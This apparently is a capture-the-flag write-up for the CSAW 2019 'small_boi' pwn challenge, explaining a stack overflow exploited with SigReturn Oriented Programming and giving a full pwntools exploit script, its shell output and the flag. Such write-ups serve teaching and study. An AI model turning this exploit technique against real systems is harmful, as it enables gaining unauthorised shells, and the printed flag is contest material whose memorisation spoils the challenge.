@@ -1,0 +1,121 @@
+I"k+<p>Very tiny binary. I used SigReturn Oriented Programming (SROP) to exploit it.</p>
+
+<h3 id="challenge">Challenge</h3>
+
+<ul>
+  <li><strong>Category:</strong> pwn</li>
+  <li><strong>Points:</strong> 100</li>
+  <li><strong>Solves:</strong> ~150</li>
+</ul>
+
+<blockquote>
+  <p>you were a baby boi earlier, can you be a small boi now?</p>
+
+  <p>nc pwn.chal.csaw.io 1002</p>
+</blockquote>
+
+<h3 id="solution">Solution</h3>
+
+<p>We get given a very tiny binary with only three functions. We have <code class="highlighter-rouge">start</code> which calls <code class="highlighter-rouge">sub_40018C</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">public</span> <span class="n">start</span>
+<span class="n">start</span> <span class="n">proc</span> <span class="n">near</span>
+<span class="p">;</span> <span class="n">__unwind</span> <span class="p">{</span>
+<span class="n">push</span>    <span class="n">rbp</span>
+<span class="n">mov</span>     <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
+<span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
+<span class="n">call</span>    <span class="n">sub_40018C</span>
+<span class="n">xor</span>     <span class="n">rax</span><span class="p">,</span> <span class="n">rdi</span>
+<span class="n">mov</span>     <span class="n">rax</span><span class="p">,</span> <span class="mi">3</span><span class="n">Ch</span> <span class="p">;</span> <span class="sc">'&lt;'</span>
+<span class="n">syscall</span>                 <span class="p">;</span> <span class="n">LINUX</span> <span class="o">-</span> <span class="n">sys_exit</span>
+<span class="n">nop</span>
+<span class="n">pop</span>     <span class="n">rbp</span>
+<span class="n">retn</span>
+<span class="p">;</span> <span class="p">}</span> <span class="c1">// starts at 4001AD</span>
+<span class="n">start</span> <span class="n">endp</span>
+</code></pre></div></div>
+
+<p>We have <code class="highlighter-rouge">sub_40018C</code> which simply does a <code class="highlighter-rouge">read</code> syscall and reads 0x200 bytes of input into a stack buffer (giving us a buffer overflow):</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sub_40018C</span> <span class="n">proc</span> <span class="n">near</span>
+
+<span class="n">buf</span><span class="o">=</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">-</span><span class="mi">20</span><span class="n">h</span>
+
+<span class="p">;</span> <span class="n">__unwind</span> <span class="p">{</span>
+<span class="n">push</span>    <span class="n">rbp</span>
+<span class="n">mov</span>     <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
+<span class="n">lea</span>     <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">buf</span><span class="p">]</span>
+<span class="n">mov</span>     <span class="n">rsi</span><span class="p">,</span> <span class="n">rax</span>        <span class="p">;</span> <span class="n">buf</span>
+<span class="n">xor</span>     <span class="n">rax</span><span class="p">,</span> <span class="n">rax</span>
+<span class="n">xor</span>     <span class="n">rdi</span><span class="p">,</span> <span class="n">rdi</span>        <span class="p">;</span> <span class="n">fd</span>
+<span class="n">mov</span>     <span class="n">rdx</span><span class="p">,</span> <span class="mi">200</span><span class="n">h</span>       <span class="p">;</span> <span class="n">count</span>
+<span class="n">syscall</span>                 <span class="p">;</span> <span class="n">LINUX</span> <span class="o">-</span> <span class="n">sys_read</span>
+<span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
+<span class="n">pop</span>     <span class="n">rbp</span>
+<span class="n">retn</span>
+<span class="p">;</span> <span class="p">}</span> <span class="c1">// starts at 40018C</span>
+<span class="n">sub_40018C</span> <span class="n">endp</span>
+</code></pre></div></div>
+
+<p>And finally we have <code class="highlighter-rouge">sub_40017C</code> which has a <code class="highlighter-rouge">rt_sigreturn</code> syscall, hinting at the fact that we will need to do SigReturn Oriented Programming (SROP):</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sub_40017C</span> <span class="n">proc</span> <span class="n">near</span>
+<span class="p">;</span> <span class="n">__unwind</span> <span class="p">{</span>
+<span class="n">push</span>    <span class="n">rbp</span>
+<span class="n">mov</span>     <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
+<span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="n">Fh</span>
+<span class="n">syscall</span>                 <span class="p">;</span> <span class="n">LINUX</span> <span class="o">-</span> <span class="n">sys_rt_sigreturn</span>
+<span class="n">nop</span>
+<span class="n">pop</span>     <span class="n">rbp</span>
+<span class="n">retn</span>
+<span class="p">;</span> <span class="p">}</span> <span class="c1">// starts at 40017C</span>
+<span class="n">sub_40017C</span> <span class="n">endp</span>
+</code></pre></div></div>
+
+<p>The way the <code class="highlighter-rouge">rt_sigreturn</code> syscall works is by context-switching into a completely new stack frame which is decided by a <code class="highlighter-rouge">sigcontext</code> structure. In the case of SROP, we forge a <code class="highlighter-rouge">sigcontext</code> structure on the stack and make the <code class="highlighter-rouge">rt_sigreturn</code> syscall use this forged structure to perform any syscall we want.</p>
+
+<p>At the end of the day we want to perform an <code class="highlighter-rouge">execve</code> syscall with <code class="highlighter-rouge">/bin/sh</code> as its argument. The binary also conveniently has the string <code class="highlighter-rouge">'/bin/sh'</code> at address <code class="highlighter-rouge">0x4001ca</code>. With pwntools, this exploit is very easy.</p>
+
+<p>Using gdb, first find the offset for the buffer overflow (in this case, 40 characters). Then you want to jump to the <code class="highlighter-rouge">rt_sigreturn</code> syscall, which is essentially just <code class="highlighter-rouge">mov rax, 0xf</code> followed by <code class="highlighter-rouge">syscall</code>. Then you put a fake <code class="highlighter-rouge">sigcontext</code> structure onto the stack (pwntools calls this a <code class="highlighter-rouge">SigreturnFrame</code>), where you set <code class="highlighter-rouge">rax</code> to 59 (for <code class="highlighter-rouge">execve</code>), <code class="highlighter-rouge">rdi</code> to the address of the <code class="highlighter-rouge">/bin/sh</code> string, <code class="highlighter-rouge">rsi</code> and <code class="highlighter-rouge">rdx</code> both to 0, and <code class="highlighter-rouge">rip</code> to the <code class="highlighter-rouge">syscall</code> instruction.</p>
+
+<p>the <code class="highlighter-rouge">rt_sigreturn</code> syscall will context switch using these values from the fake <code class="highlighter-rouge">sigcontext</code> structure, thus calling <code class="highlighter-rouge">execve</code> with <code class="highlighter-rouge">/bin/sh</code> and giving us a shell.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwn.chal.csaw.io'</span><span class="p">,</span> <span class="mi">1002</span><span class="p">)</span>
+
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x4001ca</span>
+<span class="n">sigreturn</span> <span class="o">=</span> <span class="mh">0x400180</span>
+<span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x400185</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">40</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sigreturn</span><span class="p">)</span>
+
+<span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">kernel</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">)</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">59</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">bin_sh</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-rev/csaw-2019-quals/pwn/small_boi<span class="nv">$ </span>./exploit.py
+<span class="o">[</span>+] Opening connection to pwn.chal.csaw.io on port 1002: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="err">$</span>
+<span class="nv">$ </span><span class="nb">ls
+</span>flag.txt  small_boi
+<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+flag<span class="o">{</span>sigrop_pop_pop_pop<span class="o">}</span>
+<span class="nv">$ </span> 
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">flag{sigrop_pop_pop_pop}</code></p>
+:ET
